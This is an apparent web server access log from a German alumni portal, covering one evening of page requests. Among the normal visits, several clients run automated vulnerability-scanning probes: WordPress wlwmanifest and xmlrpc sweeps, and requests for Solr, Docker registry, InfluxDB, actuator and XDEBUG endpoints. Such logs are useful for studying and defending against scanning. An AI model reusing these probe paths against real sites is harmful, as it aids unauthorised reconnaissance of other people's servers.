user;timestamp;referer;target;method;status
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:29;;/;GET;200
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:31;;//blog/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:33;;//web/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:35;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:36;;//website/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:37;;//wp/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:39;;//news/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:40;;//2020/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:41;;//2019/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:42;;//shop/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:43;;//wp1/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:44;;//test/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:44;;//wp2/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:45;;//site/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:46;;//cms/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:47;;//sito/wp-includes/wlwmanifest.xml;GET;404
d5ff254eb3eaa8e70e45fe8c2c50382e6f39d130f8d628ee24fcf0ac78024e2c;2025-11-18 14:51:49;;/sitemap.xml;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-18 14:52:36;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/HB0002;GET;200
15b572aa86215eabf3071f39fa5a2a99309e8cbd18a1b33cb3990239c0e35430;2025-11-18 14:54:40;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
346f1503a574eac64ad70d710d500381158c15c5097a3147a8e7a2bcb8558348;2025-11-18 14:55:34;;/;GET;200
dafea624eb7fbf2a193a10ada75cb9c945fc0d2a6c80716a4c079a11df965bf6;2025-11-18 15:00:05;;/;GET;200
404b8ae57482a42363d372ede91ae2ba05dc1bc78e67e3003d0ccd4ad328ddf0;2025-11-18 15:07:17;;/;GET;200
553dcd9ee7e6d442399e434b02c52ba7c03c74347143dd490440f931d2684ad4;2025-11-18 15:13:51;;/;GET;200
b4b07e230f83db42bddbd191a33c38a3fae0deba1ddd3ff1633c75cc29b5d9de;2025-11-18 15:14:04;;/;GET;200
1cc07f48532d610b69cc7988b26cc51417a729879f95be6c9c56d4f8ddfe9870;2025-11-18 15:31:57;;/gruppen/hobby/fremdsprachen;GET;302
35a08e7bde4241017b3bf055c81a55fdf5b7383120d051a11abb6855dbfa7334;2025-11-18 15:39:26;/v2/_catalog;/v2/_catalog;GET;404
27e72bd2764cd8290f3e0bb16f39714572f7f6f79e9baf85037a4c63881b9bd9;2025-11-18 15:39:26;/query?q=SHOW+DIAGNOSTICS;/query?q=SHOW+DIAGNOSTICS;GET;404
d06dcbe32f46b5c2b9be6b90769de013041809c39a96bcf5d8df20f69f6936c0;2025-11-18 15:39:26;/solr/admin/info/system;/solr/admin/info/system;GET;404
35a08e7bde4241017b3bf055c81a55fdf5b7383120d051a11abb6855dbfa7334;2025-11-18 15:39:26;;/;GET;200
d06dcbe32f46b5c2b9be6b90769de013041809c39a96bcf5d8df20f69f6936c0;2025-11-18 15:39:26;/solr/admin/cores?action=STATUS&wt=json;/solr/admin/cores?action=STATUS&wt=json;GET;404
e591e592255e08f07957a1fbe00e972fd2ae44162980e313bfea1d966fb4a2ff;2025-11-18 15:39:26;/;/;GET;200
74d56dbcd52e2686b8998928d9a615634b6eb2a7b380b5731b30aa1bf54a2df4;2025-11-18 15:39:33;;/plugins/content/apismtp/apismtp.php?test=hello;GET;404
dd1f5e29a1242c105706247400462104cf01119a8920b336bb41294610a958f2;2025-11-18 15:44:14;/;/;GET;200
6a26251cb5a8693f6ef808fe5e437239f654ec5721571e31fe63573f906dd296;2025-11-18 15:44:14;;/;GET;200
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:31;;/;GET;200
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:33;;//wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:33;;//xmlrpc.php?rsd;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:33;;/;GET;200
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:34;;//blog/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:34;;//web/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:35;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:35;;//website/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:35;;//wp/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:36;;//news/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:36;;//2020/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:37;;//2019/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:37;;//shop/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:37;;//wp1/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:38;;//test/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:38;;//wp2/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:38;;//site/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:39;;//cms/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:39;;//sito/wp-includes/wlwmanifest.xml;GET;404
f4dff3af1425db4d0a97878e9354c9abb4690433087e2f70c3998ead9d1c0098;2025-11-18 15:54:36;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-18 16:03:27;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/67945;GET;200
40f9a08349af7fc3ca585055213570da3a0a0b0131e555c9869796fe72b12989;2025-11-18 16:05:59;/;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-18 16:23:04;/personen/alumni/details/sebastian-langhorst;/personen/alumni/details/sebastian-langhorst;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-18 16:24:23;/personen/all/5;/personen/alumni/details/jana-zenker;GET;200
3ba94cbd63680ddb1b3fac8cc5e1bc0ddce5fcffd8eabb9d4c806459157d28b5;2025-11-18 16:25:45;;/personen/alumni/details/sophia-gawron;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-18 16:30:38;;/gruppen/hobby/geschichte;GET;302
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:31;;/;GET;200
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:33;;//wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:34;;//xmlrpc.php?rsd;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:37;;/;GET;200
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:38;;//blog/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:39;;//web/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:41;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:41;;//website/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:43;;//wp/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:44;;//news/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:45;;//2020/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:45;;//2019/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:46;;//shop/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:47;;//wp1/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:49;;//test/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:50;;//wp2/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:51;;//site/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:52;;//cms/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:53;;//sito/wp-includes/wlwmanifest.xml;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-18 16:40:52;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/59013;GET;200
94d0b5e5812a36bed998f0115936d74241882d3d868819cf0c223498d4d4961c;2025-11-18 16:58:03;;/;GET;200
5e1bb3b150d895a1263d17728a9aa1ed56f3ab5568cd2fe97bf546ae84d11888;2025-11-18 16:58:49;;/;GET;200
b1bbc950dbee7b355c41306928c4fc527defc4dfbcfa73d1eef0d9231e36c8b0;2025-11-18 17:07:30;;/aktuelles/stellenangebote;GET;200
ba9d1265cb9daf958bb49434b21c499b1cb2c2a748b558a69ef3f5c6392683f4;2025-11-18 17:12:48;;/;GET;200
f7fc043231f14a1e4f478bfc1b603e77b30d93b188cfe4e2de1bffa270ef8cb4;2025-11-18 17:36:12;;/;GET;200
40832cd36de64fcccba4ebc88e589f1b456e835c58fe9b647ac28e51b3bd163e;2025-11-18 17:49:39;;/personen/alumni/details/sophia-gawron;GET;200
50f9c45231d178d8afe8e3fabf5340c389f686d3f631208d8d348c3017c6b42d;2025-11-18 17:58:41;;/;GET;200
e18a5d0426c8581b28ff2d243a07dee29a58c87b969996391006b48d87b223a8;2025-11-18 18:05:08;;/;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-18 18:10:27;;/;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-18 18:21:27;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-18 18:37:34;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
8b486169b11d9ae962e4a4a4e29ea90180054a5c217bc9c1a1b89a7383dfbc8d;2025-11-18 18:41:07;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
0f4fe32edc110a43177fc3522f26c2a3f3d2db4fa740fdde873d0e51f26b372d;2025-11-18 18:44:42;;/;GET;200
b6ec75bbb2858e5c9765836955f136fecedef6d40c7155340bd47636e77c36b9;2025-11-18 18:50:30;;/personen/alumni/schule/9002;GET;200
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:19;/SNfU;/SNfU;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:20;/TPiP;/TPiP;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:22;/aab8;/aab8;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:29;/jquery-3.3.1.slim.min.js;/jquery-3.3.1.slim.min.js;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:30;/aab9;/aab9;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:35;/jquery-3.3.2.slim.min.js;/jquery-3.3.2.slim.min.js;GET;404
1e8f7541d0ef654fa631946bed5d3db830bc0aa3d6472927e9940f2c14de56a2;2025-11-18 19:13:24;;/;GET;200
3775543c26c8f7bd595c78eba19347aa0c0323a7ea4a4a1f47cb2b3b1c601088;2025-11-18 19:15:59;;/vkey/;GET;404
c91b48ab9f08343c0a73f755283f7843c14a63ecf1e5cce124980cd33cd98a48;2025-11-18 19:19:37;/vkey/;/vkey/;GET;404
0a6b2dfa34d7ca093df84253b874b6b2eb8a57581427868418533cf618602d05;2025-11-18 19:19:44;;/sitemap.xml.gz;GET;404
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-18 19:19:54;;/;GET;200
7c622f97fe3be827ed4c02a84f249302514eaac4e68d86ed58f28c0e8758754e;2025-11-18 19:21:49;;/;GET;200
16a4ca87dd31e0f2abab0b473d0ce1905f4a8ce1150fb0fed01584c36aff861b;2025-11-18 19:23:01;;/;GET;200
413a6f12113a0414efd5202d136fe34229a4204561998575d2f97cd08020851d;2025-11-18 19:33:07;;/admin/config.php;GET;404
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:44:18;;/;GET;200
5a9d31a106716492a71546cd6e89174e3d84f4e5f39577f0527a41276df2350b;2025-11-18 19:45:47;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:47:04;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:52:54;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:52:54;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:54:18;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:55:12;;/;GET;200
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:01;;//wp-includes/ID3/license.txt;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:03;;//feed/;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:03;;//xmlrpc.php?rsd;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:04;;//blog/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:04;;//web/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:05;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:05;;//wp/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:06;;//2020/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:06;;//2019/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:06;;//2021/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:07;;//shop/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:07;;//wp1/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:08;;//test/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:08;;//site/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:08;;//cms/wp-includes/wlwmanifest.xml;GET;404
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:59:23;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:59:48;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:59:48;;/;GET;200
c6abe1e3b09f03c9cfb657b8f349a2c44fa4f0aa5ea8f06e3ee78c514554dbd9;2025-11-18 20:01:57;;/;GET;200
c6abe1e3b09f03c9cfb657b8f349a2c44fa4f0aa5ea8f06e3ee78c514554dbd9;2025-11-18 20:02:06;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-18 20:04:30;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-18 20:04:30;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
5df8e58963011ed60f600a70b74a506bec01c8bb863a9abbe22bfb9b61fb2ecf;2025-11-18 20:10:30;;/;GET;200
5df8e58963011ed60f600a70b74a506bec01c8bb863a9abbe22bfb9b61fb2ecf;2025-11-18 20:10:35;/;/personen;GET;200
d2ce9f42e17f1d04e647e9ee525379590d9f44882fadd9b41e568e5943104dda;2025-11-18 20:11:04;;/;GET;200
0a6b2dfa34d7ca093df84253b874b6b2eb8a57581427868418533cf618602d05;2025-11-18 20:18:29;;/sitemap.xml.gz;GET;404
74817767123577c2d09fbe1db020216c0b36d5793a26bc9d3669f44cb06bf0b2;2025-11-18 20:24:30;;/;GET;200
19455ede0d7a8ca3644e409288605e688da5387a73541de835943d7a537e51d9;2025-11-18 20:25:11;;/aktuelles/stellenangebote;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 20:27:06;;/register;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-18 20:28:36;;/personen/alumni/schule/0351;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-18 20:30:02;;/login;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-18 20:31:19;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-18 20:32:01;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-18 20:32:40;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/9009;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 20:34:09;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/190962;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-18 20:35:27;/gruppen/hobby/biologie;/gruppen/hobby/debattieren;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-18 20:35:28;/gruppen/hobby/biologie;/gruppen;GET;200
ef16d3abddb95e2933df0422a4a558973f7ca3aefbf18427fb022612b56d4689;2025-11-18 20:40:19;;/gruppen/hobby/kochen-und-backen;GET;302
4324aa6805bcb9f552a626f712967c4338ab0feaa08730f6a0646df60656de83;2025-11-18 20:40:45;/;/;GET;200
b8389c94d862f68269f1d5c90638345d71e2244fb1917996cb4723b33f6893b7;2025-11-18 20:48:47;;/;GET;200
727432de4eda32924bea72076502526ef0231f9a804cd7a5eae019b9df320119;2025-11-18 20:48:47;;/;GET;200
404b8ae57482a42363d372ede91ae2ba05dc1bc78e67e3003d0ccd4ad328ddf0;2025-11-18 20:51:44;;/;GET;200
b9e38276217904790e593b42ea446c1cc2df8fb21044ae8d21afeb2e7e75c9f9;2025-11-18 21:02:34;/;/;GET;200
b9e38276217904790e593b42ea446c1cc2df8fb21044ae8d21afeb2e7e75c9f9;2025-11-18 21:02:36;/wordpress/;/wordpress/;GET;404
b9e38276217904790e593b42ea446c1cc2df8fb21044ae8d21afeb2e7e75c9f9;2025-11-18 21:04:58;/;/;GET;200
b9e38276217904790e593b42ea446c1cc2df8fb21044ae8d21afeb2e7e75c9f9;2025-11-18 21:04:59;/wordpress/;/wordpress/;GET;404
a900d50fac80378b1713e7e28cefd2fbf92cc9e855d26c132189b7196057cb43;2025-11-18 21:07:46;;/personen/alumni/details/sophia-gawron;GET;200
bc76e85959cf653c264e82d3b57d314509f041c328bfb058c666806f27f3a07c;2025-11-18 21:10:30;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-18 21:15:59;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;/aktuelles/meldungen?category=community;GET;200
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:05;;/;GET;200
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:06;;//wp-includes/wlwmanifest.xml;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:07;;//xmlrpc.php?rsd;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:07;;/;GET;200
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:08;;//blog/wp-includes/wlwmanifest.xml;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:08;;//web/wp-includes/wlwmanifest.xml;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:08;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:09;;//website/wp-includes/wlwmanifest.xml;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:09;;//wp/wp-includes/wlwmanifest.xml;GET;404
2b2178ad6d35172c5ecf279a918d3acc3423c1347d61f412f72603ce41b8d040;2025-11-18 21:21:10;;//news/wp-includes/wlwmanifest.xml;GET;404
